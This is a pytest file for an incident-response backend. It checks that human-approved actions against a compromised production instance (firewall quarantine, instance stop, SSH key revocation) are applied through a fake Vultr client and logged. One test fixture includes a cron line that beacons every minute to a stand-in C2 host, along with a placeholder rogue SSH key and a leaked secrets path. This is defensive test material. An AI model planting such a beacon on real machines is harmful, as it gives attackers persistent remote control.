"""F10: apply approved actions to production via VultrClient. Done when: API
responses logged in the case log; the production firewall group is visibly
changed (FakeVultr state)."""
from __future__ import annotations

from contracts.models import ActionKind, ActionStatus, Evidence, Finding, Severity
from contracts.vultr import FakeVultr

from backend.db import ActionRow, ReportRow
from backend.recorder import DbCaseRecorder

ADMIN_IP = "203.0.113.7"


async def _case_with_menu(client, state, human, with_report=False) -> tuple:
    r = await client.post("/cases", headers=human, json={
        "instance_id": FakeVultr.SHOP_PROD, "reason": "cpu pegged"})
    assert r.status_code == 201, r.text
    cid = r.json()["id"]
    rec = DbCaseRecorder(state.sf, state.log)
    ev = Evidence(id=f"{cid}-ev-002", case_id=cid, path="/etc/cron.d/beacon",
                  sha256="ab" * 32, excerpt="* * * * * curl http://c2.example.com")
    await rec.add_evidence(ev)
    await rec.add_finding(Finding(
        id=f"{cid}-fd-001", case_id=cid, title="Cron beacon to C2",
        severity=Severity.critical, summary="cron job phones home",
        evidence_ids=[ev.id]))
    if with_report:
        with state.sf() as sn:
            sn.add(ReportRow(case_id=cid, summary="s", timeline=[],
                             ranked_actions=[],
                             rogue_ssh_keys=["ssh-ed25519 AAAA... rogue@attacker"],
                             secrets_found=["/var/www/.env"]))
            sn.commit()
    actions = await state.service.build_action_menu(cid)
    return cid, {a.kind: a for a in actions}


async def _approve(client, human, cid, action) -> dict:
    r = await client.post(f"/cases/{cid}/actions/{action.id}/approve",
                          headers=human, json={"approved_by": "operator"})
    assert r.status_code == 200, r.text
    return r.json()


async def test_apply_quarantine_visibly_changes_production_firewall(
        client, state, fake, human):
    cid, by_kind = await _case_with_menu(client, state, human)
    body = await _approve(client, human, cid, by_kind[ActionKind.quarantine_firewall])

    # the production instance now sits in the quarantine group
    assert fake.instances[FakeVultr.SHOP_PROD].firewall_group_id \
        == by_kind[ActionKind.quarantine_firewall].api_body["firewall_group_id"]
    assert body["status"] == ActionStatus.applied.value
    assert body["response"]["status_code"] == 202
    assert body["response"]["method"] == "PATCH"

    # the API response is in the hash-chained case log
    entries = [e for e in state.log.entries(cid) if e.event == "action_applied"]
    assert len(entries) == 1
    assert entries[0].payload["api"]["status_code"] == 202
    state.log.sse_replay(cid)  # payload validates against contracts.events
    # and persisted on the action row
    with state.sf() as sn:
        row = sn.get(ActionRow, by_kind[ActionKind.quarantine_firewall].id)
    assert row.status == ActionStatus.applied.value
    assert row.response["status_code"] == 202


async def test_apply_halt_stops_production_instance(client, state, fake, human):
    cid, by_kind = await _case_with_menu(client, state, human)
    body = await _approve(client, human, cid, by_kind[ActionKind.stop_instance])
    assert body["status"] == ActionStatus.applied.value
    assert body["response"]["status_code"] == 204
    assert fake.instances[FakeVultr.SHOP_PROD].power_status == "stopped"


async def test_human_run_actions_apply_without_any_api_call(
        client, state, fake, human):
    cid, by_kind = await _case_with_menu(client, state, human, with_report=True)
    rk = by_kind[ActionKind.revoke_ssh_key]
    body = await _approve(client, human, cid, rk)
    assert body["status"] == ActionStatus.applied.value
    assert body["response"] is None  # nothing executed: the human runs the command
    entries = [e for e in state.log.entries(cid) if e.event == "action_applied"]
    assert entries[0].payload["action"]["id"] == rk.id
    assert entries[0].payload["api"] is None
    # no raw call left for a no-API kind
    assert not any(c[0] in ("PATCH", "POST") and "/v2/instances/" in c[1]
                   for c in fake.calls
                   if c[1].startswith(f"/v2/instances/{FakeVultr.SHOP_PROD}"))


async def test_apply_failure_is_logged_and_marks_action_rejected(
        client, state, human):
    cid, by_kind = await _case_with_menu(client, state, human)
    q = by_kind[ActionKind.quarantine_firewall]
    with state.sf() as sn:  # the group id in the action points nowhere
        row = sn.get(ActionRow, q.id)
        row.api_body = {"firewall_group_id": "fw-does-not-exist"}
        sn.commit()
    body = await _approve(client, human, cid, q)
    assert body["status"] == ActionStatus.rejected.value
    assert body["response"]["status_code"] == 400
    entries = [e for e in state.log.entries(cid) if e.event == "action_applied"]
    assert entries[0].payload["api"]["status_code"] == 400  # failure logged too
